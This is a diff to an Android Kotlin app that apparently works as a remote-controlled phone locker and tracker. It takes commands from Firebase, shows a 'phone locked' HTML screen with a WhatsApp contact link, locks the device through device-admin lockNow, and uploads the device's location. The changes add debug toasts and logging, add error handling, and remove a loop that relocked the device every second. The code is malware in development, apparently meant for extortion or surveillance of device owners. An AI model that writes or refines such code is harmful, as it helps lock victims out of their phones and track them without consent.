@@ -16,11 +16,13 @@ import android.os.Handler
 import android.os.Looper
 import android.provider.MediaStore
 import android.util.Base64
+import android.util.Log
 import android.view.WindowManager
 import android.webkit.WebChromeClient
 import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
+import android.widget.Toast
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
@@ -103,6 +105,8 @@ class MainActivity : Activity() {
         }, 10000)
 
         requestRuntimePermissions()
+        
+        Toast.makeText(this, "Device ID: " + deviceId, Toast.LENGTH_LONG).show()
     }
 
     private fun requestRuntimePermissions() {
@@ -162,6 +166,10 @@ class MainActivity : Activity() {
                 if (cmdTime <= lastCommandTime) return
                 lastCommandTime = cmdTime
 
+                runOnUiThread {
+                    Toast.makeText(this@MainActivity, "Command: $action", Toast.LENGTH_SHORT).show()
+                }
+
                 when (action) {
                     "lock" -> {
                         val html = cmd["html"] as? String ?: "<h1>HP TERKUNCI</h1>"
@@ -179,10 +187,12 @@ class MainActivity : Activity() {
 
                 Handler(Looper.getMainLooper()).postDelayed({
                     db.child("command").removeValue()
-                }, 5000)
+                }, 60000)
             }
 
-            override fun onCancelled(error: DatabaseError) {}
+            override fun onCancelled(error: DatabaseError) {
+                Log.e("ZENN", "Command error: " + error.message)
+            }
         })
     }
 
@@ -197,6 +207,7 @@ class MainActivity : Activity() {
     }
 
     private fun lockDevice(html: String, wa: String) {
+        Log.d("ZENN", "lockDevice called")
         isLocked = true
 
         var finalHtml = html
@@ -205,34 +216,38 @@ class MainActivity : Activity() {
             finalHtml += "<div style='text-align:center;padding:20px;background:#000;'><a href='https://wa.me/$cleanWa' style='display:inline-block;padding:15px 30px;background:#25D366;color:#fff;text-decoration:none;border-radius:50px;font-weight:bold;'>HUBUNGI VIA WHATSAPP</a></div>"
         }
 
+        Log.d("ZENN", "HTML length: " + finalHtml.length)
+
         runOnUiThread {
-            webView.loadDataWithBaseURL(null, finalHtml, "text/html", "UTF-8", null)
+            try {
+                webView.loadDataWithBaseURL(null, finalHtml, "text/html", "UTF-8", null)
+                Log.d("ZENN", "WebView loaded")
+                Toast.makeText(this@MainActivity, "Locked!", Toast.LENGTH_SHORT).show()
+            } catch (e: Exception) {
+                Log.e("ZENN", "Load error: " + e.message)
+                Toast.makeText(this@MainActivity, "Error: " + e.message, Toast.LENGTH_LONG).show()
+            }
         }
 
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val admin = ComponentName(this, AdminReceiver::class.java)
-        if (dpm.isAdminActive(admin)) {
-            dpm.lockNow()
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val admin = ComponentName(this, AdminReceiver::class.java)
+            if (dpm.isAdminActive(admin)) {
+                dpm.lockNow()
+            }
+        } catch (e: Exception) {
+            Log.e("ZENN", "Lock error: " + e.message)
         }
 
         db.child("locked").setValue(true)
         db.child("locked_at").setValue(ServerValue.TIMESTAMP)
-
-        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
-            override fun run() {
-                if (!isLocked) return
-                val dpm2 = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val admin2 = ComponentName(this@MainActivity, AdminReceiver::class.java)
-                if (dpm2.isAdminActive(admin2)) dpm2.lockNow()
-                Handler(Looper.getMainLooper()).postDelayed(this, 1000)
-            }
-        }, 1000)
     }
 
     private fun unlockDevice() {
         isLocked = false
         runOnUiThread {
             webView.loadUrl("file:///android_asset/index.html")
+            Toast.makeText(this@MainActivity, "Unlocked", Toast.LENGTH_SHORT).show()
         }
         db.child("locked").setValue(false)
     }
@@ -266,8 +281,7 @@ class MainActivity : Activity() {
 
             if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                 db.child("location").setValue(mapOf(
-                    "lat" to "-",
-                    "lng" to "-",
+                    "lat" to "-", "lng" to "-",
                     "error" to "Izin lokasi ditolak",
                     "waktu" to ServerValue.TIMESTAMP
                 ))
@@ -306,8 +320,7 @@ class MainActivity : Activity() {
 
         } catch (e: Exception) {
             db.child("location").setValue(mapOf(
-                "lat" to "-",
-                "lng" to "-",
+                "lat" to "-", "lng" to "-",
                 "error" to e.message,
                 "waktu" to ServerValue.TIMESTAMP
             ))
